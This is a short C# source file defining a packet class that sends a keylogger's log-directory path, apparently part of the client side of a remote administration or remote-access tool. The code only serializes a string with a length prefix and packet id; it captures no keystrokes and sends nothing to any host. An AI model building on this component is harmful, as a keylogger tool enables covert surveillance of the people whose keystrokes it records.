using Common.Networking;
using Common.Networking.Packets;
using Common.Utilities;

namespace Client.Networking.Packets.Keylogger
{
    public class GetKeyloggerLogsDirectoryPacket : RequestPacket
    {
        public override int Id => 0x60;
        public string LogsDirectory { get; set; }

        public override void Serialize(ProcessStream stream)
        {
            using var packetStream = new ProcessStream();

            packetStream.WriteString(LogsDirectory);

            stream.Lock.Wait();
            stream.WriteInt(4 + (int)packetStream.Length);
            stream.WriteInt(Id);
            packetStream.Position = 0;
            packetStream.CopyTo(stream);
            stream.Lock.Release();
        }
    }
}
